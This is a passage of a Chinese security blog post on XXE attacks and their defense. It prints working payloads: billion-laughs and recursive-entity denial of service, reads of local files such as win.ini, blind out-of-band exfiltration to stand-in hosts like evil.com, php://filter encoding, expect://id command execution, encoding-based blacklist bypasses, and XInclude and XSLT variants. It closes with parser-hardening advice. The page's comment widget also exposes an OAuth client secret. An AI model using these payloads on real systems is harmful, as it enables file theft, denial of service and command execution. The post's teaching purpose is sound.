class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;"&gt;</span></div><div class="line">]&gt;</div><div class="line"><span class="params">&lt;lolz&gt;</span><span class="variable">&amp;lol9</span>;<span class="params">&lt;/lolz&gt;</span></div></pre></td></tr></table></figure>
+<p>这是一个著名的针对XML的billion laughs Dos攻击，其递归构造实体引用，其会产生3G左右的内存数据。</p>
+<p>原理是：<br><strong>构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</strong></p>
+<p>除了这种方式，还可以引用一个外部很大的xml文件，造成Dos攻击，如下:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY dos SYSTEM "file:///publicServer.com/largeFile.xml" &gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;dos;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h5 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [</span></div><div class="line">&lt;!ELEMENT foo ANY &gt;</div><div class="line">&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" &gt;</div><div class="line">]&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>或者:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [</span></div><div class="line">&lt;!ELEMENT foo ANY &gt;</div><div class="line">&lt;!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;</div><div class="line">%xxe;</div><div class="line">]&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div><div class="line"></div><div class="line">-- 外部evil.dtd中的内容</div><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">evil</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>" &gt;</span></div></pre></td></tr></table></figure>
+<p><code>simplexml_load_string()</code>函数，用于转换形式良好的<code>XML</code>字符串为<code>SimpleXMLElement</code>对象，然后输出对象的键和元素.是有XXE漏洞的标志性函数。</p>
+<p>这种XXE可以和SSRF相结合</p>
+<h5 id="blind-XEE"><a href="#blind-XEE" class="headerlink" title="blind XEE"></a>blind XEE</h5><p>没有回显，采用<strong>外带数据通道提取数据</strong></p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///c://test/1.txt"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://evil.com/evil.xml"&gt; </div><div class="line"><span class="perl">%dtd; %all; </span><span class="xml"><span class="meta"></span></span></div><div class="line">]&gt; </div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div><div class="line"></div><div class="line">其中evil.xml内容:</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span> "&lt;!<span class="attr">ENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">evil.com</span>/%<span class="attr">file</span>;'&gt;</span>"&gt;</div></pre></td></tr></table></figure>
+<p>调用过程为：参数实体dtd调用外部实体<code>evil.xml</code>，然后又调用参数实体<code>all</code>，接着调用命名实体<code>send</code>，通过这种方式，将读取的文件通过触发访问的方式传到了所属的evil服务器。</p>
+<p>使用<code>php://filter</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://evil.com/evil.xml"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div><div class="line">&lt;root&gt;&lt;/root&gt;</div><div class="line"></div><div class="line">其中evil.xml文件内容为：</div><div class="line"></div><div class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;"&gt; %payload;</div></pre></td></tr></table></figure>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">关于<code>php://filter</code>的用法，可以参考这篇文章</a></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">php://<span class="built_in">filter</span>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流</div><div class="line"></div><div class="line">可以用如下一行代码将POST内容转换成base64编码并输出:</div><div class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://input</div><div class="line"></div><div class="line">将xee.php的内容bbase64编码输出:</div><div class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=./xxe.php</div></pre></td></tr></table></figure>
+<p>利用其编码解码有时可以绕过一些保护。</p>
+<h5 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h5><p>在安装<code>expect</code>扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<h5 id="Content-Type修改"><a href="#Content-Type修改" class="headerlink" title="Content-Type修改"></a>Content-Type修改</h5><p>在目前的web服务当中，很多服务器与客户端都是使用<code>json</code>格式进行数据交换的，而有些服务器虽然用户提交的是<code>json</code>或<code>text</code>格式，但其是可以解析<code>xml</code>格式内容的，这时候，通过修改HTTP头部<code>Content-Type</code>字段，有时可以构成XXE攻击。</p>
+<p>假设正常通信数据包是这样的：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">HTTP <span class="string">Request:</span></div><div class="line">POST <span class="regexp">/netspi HTTP/</span><span class="number">1.1</span></div><div class="line"><span class="string">Host:</span> someserver.netspi.com</div><div class="line"><span class="string">Accept:</span> application/json</div><div class="line">Content-<span class="string">Type:</span> application/json</div><div class="line">Content-<span class="string">Length:</span> <span class="number">38</span></div><div class="line">&#123;<span class="string">"search"</span>:<span class="string">"name"</span>,<span class="string">"value"</span>:<span class="string">"netspitest"</span>&#125;</div><div class="line">HTTP <span class="string">Response:</span></div><div class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</div><div class="line">Content-<span class="string">Type:</span> application/json</div><div class="line">Content-<span class="string">Length:</span> <span class="number">43</span></div><div class="line"></div><div class="line">&#123;<span class="string">"id"</span>: <span class="string">"1"</span>&#125;</div></pre></td></tr></table></figure>
+<p>可以修改为xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HTTP Request:</div><div class="line">POST /netspi HTTP/1.1</div><div class="line">Host: someserver.netspi.com</div><div class="line">Accept: application/json</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 112</div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>name<span class="tag">&lt;/<span class="name">search</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>netspitest<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>如果服务器相应为:</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HTTP <span class="string">Response:</span></div><div class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</div><div class="line">Content-<span class="string">Type:</span> application/json</div><div class="line">Content-<span class="string">Length:</span> <span class="number">43</span></div><div class="line">&#123;<span class="string">"error"</span>: <span class="string">"no results for name netspitest"</span>&#125;</div></pre></td></tr></table></figure>
+<p>这样就能确定很可能存在XXE漏洞，再按外部实体引用的方式去构造即可。</p>
+<h5 id="递归引用实体"><a href="#递归引用实体" class="headerlink" title="递归引用实体"></a>递归引用实体</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY a "a&amp;b;" &gt;</div><div class="line">&lt;!ENTITY b "&amp;a;" &gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h5 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h5><p>一些比较低级的黑名单可以通过修改xml编码的方式绕过:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-7"</span> <span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ELEMENT data (#PCDATA)&gt;</div><div class="line">&lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-16"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ELEMENT data (#PCDATA)&gt;</div><div class="line">&lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h4 id="xml-schema-实体攻击"><a href="#xml-schema-实体攻击" class="headerlink" title="xml schema 实体攻击"></a>xml schema 实体攻击</h4><p><code>XML Schema</code>：称为可扩展标记语言架构，用来定义XM文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情。常见的<code>xml schema attack</code>分为：</p>
+<ul>
+<li>schemaLocation</li>
+<li>noNamespaceSchemaLocation</li>
+<li>XInclude</li>
+<li>XSLT 攻击</li>
+</ul>
+<h5 id="schemaLocation"><a href="#schemaLocation" class="headerlink" title="schemaLocation"></a>schemaLocation</h5><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=’<span class="number">1.0</span>′<span class="meta">?&gt;</span></span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;</div><div class="line"><span class="perl">%remote;</span><span class="xml"><span class="meta"></span></span></div><div class="line">]&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">ttt:data</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></div><div class="line">    <span class="attr">xmlns:ttt</span>=<span class="string">"http://test.com/attack"</span></div><div class="line"><span class="attr">xsi:schemaLocation</span>=<span class="string">"ttt http://publicServer.com/&amp;internal;"</span>&gt;4<span class="tag">&lt;/<span class="name">ttt:data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h5 id="noNamespaceSchemaLocation"><a href="#noNamespaceSchemaLocation" class="headerlink" title="noNamespaceSchemaLocation"></a>noNamespaceSchemaLocation</h5><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=’<span class="number">1.0</span>′<span class="meta">?&gt;</span></span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;</div><div class="line"><span class="perl">%remote;</span><span class="xml"><span class="meta"></span></span></div><div class="line">]&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></div><div class="line">    <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">"http://publicServer.com/&amp;internal;"</span>&gt;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h5 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h5><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0″ encoding="</span>utf<span class="number">-8</span>″<span class="meta">?&gt;</span></span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;</div><div class="line"><span class="perl">%remote;</span><span class="xml"><span class="meta"></span></span></div><div class="line">]&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"http://192.168.2.31/&amp;internal;"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>其中属性值使用<code>&amp;internal;</code>的方式可以学习</p>
+<h5 id="XSLT-Attack"><a href="#XSLT-Attack" class="headerlink" title="XSLT Attack"></a>XSLT Attack</h5><p>XML Out-Of-Band Data Retrieval，可以通过如下的方式先用<code>document()</code>获得目标主机的信息，然后使用<code>concat()</code>将数据与evil主机进行拼接，然后<code>document()</code>访问拼接后的地址，便可以在evil主机日志上获得信息。 </p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;xsl:<span class="built_in">variable</span> name=<span class="string">"payload"</span></div><div class="line">    <span class="keyword">select</span>=<span class="string">"document('http://sensitive_host/',/)"</span>/&gt;</div><div class="line">&lt;xsl:<span class="built_in">variable</span> name=<span class="string">"combine"</span></div><div class="line">    <span class="keyword">select</span>=<span class="string">"concat("</span>http:<span class="comment">//evilhost/",$payload)"/&gt; </span></div><div class="line">&lt;xsl:<span class="built_in">variable</span> name=<span class="string">"result"</span></div><div class="line">    <span class="keyword">select</span>=<span class="string">"document($combine)"</span>/&gt;</div></pre></td></tr></table></figure>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>禁用外部实体引用 </li>
+<li>过滤用户提交的XML数据 (<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>等字段)</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">禁用外部实体引用</div><div class="line"></div><div class="line">php</div><div class="line"><span class="bullet">-----	</span></div><div class="line">libxml<span class="emphasis">_disable_</span>entity<span class="emphasis">_loader(true);</span></div><div class="line"></div><div class="line"><span class="section">java</span></div><div class="line">-----</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line"><span class="section">python</span></div><div class="line">-----</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve<span class="emphasis">_entities=False))</span></div></pre></td></tr></table></figure>
+<p>参考文章:<br><a href="https://web-in-security.blogspot.sg/2016/03/xxe-cheat-sheet.html" target="_blank" rel="external">web-in-security-xxe</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    empty_xl
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/blog/xxe/" title="XXE利用与防御">http://yoursite.com/blog/xxe/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
+          
+            <a href="/tags/xxe/" rel="tag"><i class="fa fa-tag"></i> xxe</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/ssrf/" rel="next" title="SSRF利用与防御">
+                <i class="fa fa-chevron-left"></i> SSRF利用与防御
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/jsonp/" rel="prev" title="JSONP注入利用与防御">
+                JSONP注入利用与防御 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+    var gitment = new Gitment({
+      // 根据文章标题设置唯一评论id
+    // id: '', // optional
+    owner: 'emptyxl',
+    repo: 'emptyxl.github.io',
+    oauth: {
+      client_id: 'fa7413e3c0207a96ae03',
+      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
+      }
+    })
+    gitment.render('comments')
+    </script>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="empty_xl" />
+          <p class="site-author-name" itemprop="name">empty_xl</p>
+           
+              <p class="site-description motion-element" itemprop="description">hello world!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">77</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/emptyxl" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="/mail/index.html" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML-简介"><span class="nav-number">1.</span> <span class="nav-text">XML 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XML作用"><span class="nav-number">1.1.</span> <span class="nav-text">XML作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML结构"><span class="nav-number">1.2.</span> <span class="nav-text">XML结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML特性"><span class="nav-number">1.3.</span> <span class="nav-text">XML特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XMLHttpRequest"><span class="nav-number">1.4.</span> <span class="nav-text">XMLHttpRequest</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD"><span class="nav-number">1.5.</span> <span class="nav-text">DTD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-Attack"><span class="nav-number">2.</span> <span class="nav-text">XXE Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE利用"><span class="nav-number">2.1.</span> <span class="nav-text">XXE利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#XXE读文件"><span class="nav-number">2.1.1.</span> <span class="nav-text">XXE读文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#拒绝服务"><span class="nav-number">2.1.2.</span> <span class="nav-text">拒绝服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#有回显情况"><span class="nav-number">2.1.3.</span> <span class="nav-text">有回显情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#blind-XEE"><span class="nav-number">2.1.4.</span> <span class="nav-text">blind XEE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行系统命令"><span class="nav-number">2.1.5.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Content-Type修改"><span class="nav-number">2.1.6.</span> <span class="nav-text">Content-Type修改</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#递归引用实体"><span class="nav-number">2.1.7.</span> <span class="nav-text">递归引用实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#编码转换"><span class="nav-number">2.1.8.</span> <span class="nav-text">编码转换</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xml-schema-实体攻击"><span class="nav-number">2.2.</span> <span class="nav-text">xml schema 实体攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#schemaLocation"><span class="nav-number">2.2.1.</span> <span class="nav-text">schemaLocation</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#noNamespaceSchemaLocation"><span class="nav-number">2.2.2.</span> <span class="nav-text">noNamespaceSchemaLocation</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XInclude"><span class="nav-number">2.2.3.</span> <span class="nav-text">XInclude</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XSLT-Attack"><span class="nav-number">2.2.4.</span> <span class="nav-text">XSLT Attack</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">3.</span> <span class="nav-text">防御</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    
+    &emsp;&emsp;|&emsp;
+  </span>
+  <span class="author" itemprop="copyrightHolder">empty_xl</span>
+</div>
+
+
+<div class="powered-by">
+  
+  Power &mdash; Hexo
+</div>
+
+<div class="theme-info">
+  
+  Theme &mdash; NexT.Mist
+</div>
+<div>
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
